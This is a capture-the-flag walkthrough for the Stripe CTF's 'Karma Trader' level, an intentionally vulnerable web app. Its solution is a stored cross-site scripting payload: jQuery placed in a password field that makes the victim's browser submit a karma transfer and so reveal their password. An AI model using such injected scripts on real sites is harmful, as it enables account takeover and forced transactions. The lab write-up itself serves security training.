## Level 4

The Karma Trader is the world's best way to reward people for good deeds: https://level04-1.stripe-ctf.com/user-xxxxxxxxxx. You can sign up for an account, and start transferring karma to people who you think are doing good in the world. In order to ensure you're transferring karma only to good people, transferring karma to a user will also reveal your password to him or her.

The very active user karma\_fountain has infinite karma, making it a ripe account to obtain (no one will notice a few extra karma trades here and there). The password for karma_fountain's account will give you access to Level 5.

You can obtain the full, runnable source for the Karma Trader from `git clone https://level04-1.stripe-ctf.com/user-xxxxxxxxxx/level04-code`. We've included the most important files below.

### Running

- Install bundler: `gem install bundler`
- Run srv.rb: `./srv.rb`
- Point your browser to `localhost:4567`

### Solution

  * Create a new user with name `user` and password:

  ```javascript 
    <script type="text/javascript">
      $(function() {
        $("input[name=to]").val("user");
        $("input[name=amount]").val(1);
        $("form:first").submit();
      });
    </script>
  ```
  * Send `1` karma to user `karma_fountain`

Originally posted at [https://stripe-ctf.com/levels/4](https://stripe-ctf.com/levels/4).
